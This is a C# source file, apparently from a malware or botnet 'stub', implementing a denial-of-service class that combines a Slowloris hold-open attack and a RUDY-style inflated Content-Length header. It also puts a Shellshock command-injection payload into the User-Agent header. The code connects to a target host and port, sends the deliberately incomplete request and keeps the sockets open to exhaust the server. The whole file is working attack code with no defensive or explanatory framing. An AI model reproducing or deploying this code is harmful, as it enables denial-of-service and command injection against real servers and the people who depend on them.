using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Stub.DoS
{
    /// <summary>
    /// Slowloris, with additional "RUDY" attack (fake arbitrary Content-Length values)
    /// And now, with basic DoS Shellshock attack in User-Agent string
    /// </summary>
    class Slowloris : Base
    {
        public List<Socket> Sockets = new List<Socket>();
        public Slowloris()
        {
            this.DoSendPacketsEvent += delegate (IPAddress addr, ushort port)
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("POST / HTTP/1.1");
                sb.AppendLine("Host: " + addr.ToString());
                //Shellshock DoS
                sb.AppendLine("User-Agent: () { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20");
                sb.AppendLine("Keep-Alive: 900");
                //RUDY
                sb.AppendLine("Content-Length: 23858236396");
                sb.AppendLine("Accept: *.*");
                sb.AppendLine("X-a: 23858236396");
                //Slowloris (indirectly by not attaching another \r\n)

                byte[] payload = Encoding.UTF8.GetBytes(sb.ToString());

                sb.Clear();
                sb = null;

                Socket sock = new Socket(SocketType.Stream, ProtocolType.Tcp);
                try
                {
                    sock.Connect(addr, port);
                    sock.Send(payload, payload.Length, SocketFlags.None);
                    Sockets.Add(sock);
                }
                catch (Exception e) { }
            };
        }

        ~Slowloris()
        {
            foreach (Socket sock in Sockets)
            {
                sock.Disconnect(false);
                sock.Dispose();
            }
        }
    }
}
